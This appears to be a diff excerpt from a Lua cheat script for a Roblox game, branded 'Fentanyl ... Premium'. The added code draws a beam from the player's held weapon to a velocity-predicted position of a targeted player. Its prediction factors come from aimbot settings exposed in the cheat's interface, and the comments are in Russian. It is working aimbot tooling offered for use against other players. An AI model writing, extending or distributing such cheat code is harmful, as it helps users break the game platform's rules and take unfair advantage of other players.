+                if currentBeam then
+                    currentBeam.beam:Destroy()
+                    currentBeam.att0:Destroy()
+                    currentBeam.att1:Destroy()
+                    currentBeam = nil
+                end
+                return
+            end
+            
+            if not currentBeam then
+                currentBeam = CreateBeam()
+            end
+            
+            -- Проверяем наличие оружия с handle
+            local tool = _G.TargetingFramework and _G.TargetingFramework.utility and _G.TargetingFramework.utility:getHeld()
+            if not tool or tool == "None" or not tool.Handle then
+                if currentBeam then
+                    currentBeam.beam:Destroy()
+                    currentBeam.att0:Destroy()
+                    currentBeam.att1:Destroy()
+                    currentBeam = nil
+                end
+                return
+            end
+            
+            local origin = tool.Handle.Position
+            if not origin then return end
+            
+            local targetPlayer = _G.targeting_state.current
+            local targetPart = targetPlayer.Character and (targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head"))
+            if not targetPart then return end
+            
+            local function GetPredictedPosition(targetPlayer)
+                if not targetPlayer or not targetPlayer.Character then return nil end
+                
+                local targetPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head")
+                if not targetPart then return nil end
+                
+                -- Получаем актуальные значения из UI
+                local xzPrediction = tonumber(K.Flags["AimbotXZPrediction"]) or 0.048
+                local yPrediction = tonumber(K.Flags["AimbotYPrediction"]) or 0.048
+                local velocity = targetPart.Velocity or B(0, 0, 0)
+                
+                -- Используем логику как в примере кода
+                local predicted = targetPart.Position + B(
+                    velocity.X * xzPrediction,
+                    velocity.Y * yPrediction,
+                    velocity.Z * xzPrediction
+                )
+                
+                return predicted
+            end
+            
+            local predictedPos = GetPredictedPosition(targetPlayer)
+            currentBeam.att0.WorldPosition = origin
+            currentBeam.att1.WorldPosition = predictedPos
+        end
+        
+        beamConnection = run.Heartbeat:Connect(UpdateBeam)
+        
+        _G.BeamVisualization = {
+            connection = beamConnection,
+            cleanup = function()
+                if beamConnection then
+                    beamConnection:Disconnect()
+                    beamConnection = nil
+                end
+                if currentBeam then
+                    currentBeam.beam:Destroy()
+                    currentBeam.att0:Destroy()
+                    currentBeam.att1:Destroy()
+                    currentBeam = nil
+                end
+            end
+        }
+    end
 end
-
 do
     local Q = K:Watermark("Fentanyl | " .. g.Name .. " | " .. os.date("%y.%m.%d") .. " | Premium")
     local R = K:KeybindList()
